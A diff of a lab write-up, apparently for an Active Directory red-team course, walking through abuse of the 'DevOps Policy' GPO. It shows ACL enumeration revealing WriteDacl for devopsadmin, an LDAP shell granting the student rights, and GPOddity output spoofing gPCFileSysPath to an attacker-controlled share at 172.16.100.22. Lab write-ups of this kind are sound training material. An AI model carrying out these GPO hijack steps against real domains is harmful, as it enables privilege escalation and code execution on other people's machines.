@@ -12,7 +12,7 @@
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
+`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
 [SNIP]
 ```
@@ -23,15 +23,15 @@
 ```
 flags                    : 0
 displayname              : DevOps Policy📑
-gpcmachineextensionnames📌 : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
+gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
 whenchanged              : 12/24/2024 7:09:01 AM
 versionnumber            : 3
-name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
+name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
 cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 usnchanged               : 296496
 dscorepropagationdata    : {12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
 objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
-gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📌
+gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{0BF8D01C-1F62-4BDC-958C-57140B67D147}📁
 distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,D
                            C=local
 whencreated              : 12/18/2024 7:31:22 AM
@@ -41,6 +41,26 @@ gpcfunctionalityversion  : 2
 instancetype             : 4
 objectclass              : {top, container, groupPolicyContainer}
 objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+```
+
+`Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'devopsadmin'}`:
+```
+[SNIP]
+
+ObjectDN📌              : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147}📑,CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl📌, WriteOwner
+ObjectAceType           : None
+AceFlags                : ContainerInherit
+AceType                 : AccessAllowed
+InheritanceFlags        : ContainerInherit
+SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-17101
+IdentityReferenceName   : devopsadmin👤
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=devopsadmin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : user
+
+[SNIP]
 ```
 
 **`DevOps Policy` GPO abuse for local admin access on `dcorp-ci`**
@@ -73,7 +93,7 @@ The command completed successfully.
                1 Dir(s)   5,767,585,792 bytes free
 ```
 
-![//dcorp-ci/AI share](./assets/screenshots/learning_objective_06_dcorpci_ai_share.png)
+![\\dcorp-ci\AI share](./assets/screenshots/learning_objective_06_dcorpci_ai_share.png)
 
 It turns out that the `AI` folder is used for testing some automation that executes shortcuts (`.lnk` files) as the user `devopsadmin`.
 Recall that we enumerated a user `devopsadmin` has `WriteDACL` on `DevOps Policy` (see *Learning Objective 03*).
@@ -184,7 +204,7 @@ Using this LDAP shell, we will assign `WriteDACL` permissions on the `DevOps Pol
 
 `whoami`:
 ```
-u:dcorp\devopsadmin
+u:dcorp\devopsadmin👤
 ```
 
 `write_gpo_dacl student422 {0BF8D01C-1F62-4BDC-958C-57140B67D147}`:
@@ -224,7 +244,7 @@ Now, run the GPOddity command to create the new malicious group policy template.
 ```
 [sudo] password for wsluser:
 
-=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ===📌
+=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ===📑
 
 [*] Downloading the legitimate GPT from SYSVOL
 [+] Successfully downloaded legitimate GPO from SYSVOL to 'GPT_out' folder📌
@@ -237,7 +257,7 @@ Now, run the GPOddity command to create the new malicious group policy template.
 
 === SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ===
 
-[*] Modifying the gPCFileSysPath attribute of the GPC to '\\172.16.100.22\std422-gp'📌
+[*] Modifying the gPCFileSysPath attribute of the GPC to '\\172.16.100.22\std422-gp'📁
 [+] Successfully spoofed GPC gPCFileSysPath attribute
 [*] Updating the versionNumber attribute of the GPC
 [+] Successfully updated GPC versionNumber attribute
@@ -309,18 +329,16 @@ Verify if the `gPCfileSysPath` has been modified for the `DevOps Policy` GPO. Ru
 ```
 flags                    : 0
 displayname              : DevOps Policy📑
-gpcmachineextensionnames : [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{35378EAC-683
-                           F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00
-                           C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CA
+gpcmachineextensionnames : [{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{AADCED64-746C-4633-A97C-D61349046527}{CA
                            B54552-DEEA-4691-817E-ED4A4D1AFC72}]
 whenchanged              : 2/20/2025 3:47:16 PM
 versionnumber            : 4
-name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+name                     : {0BF8D01C-1F62-4BDC-958C-57140B67D147}📑
 cn                       : {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 usnchanged               : 1667030
 dscorepropagationdata    : {2/20/2025 3:45:17 PM, 12/18/2024 7:31:56 AM, 1/1/1601 12:00:00 AM}
 objectguid               : fc0df125-5e26-4794-93c7-e60c6eecb75f
-gpcfilesyspath           : \\172.16.100.22\std422-gp📌
+gpcfilesyspath           : \\172.16.100.22\std422-gp📁
 distinguishedname        : CN={0BF8D01C-1F62-4BDC-958C-57140B67D147},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,D
                            C=local
 whencreated              : 12/18/2024 7:31:22 AM
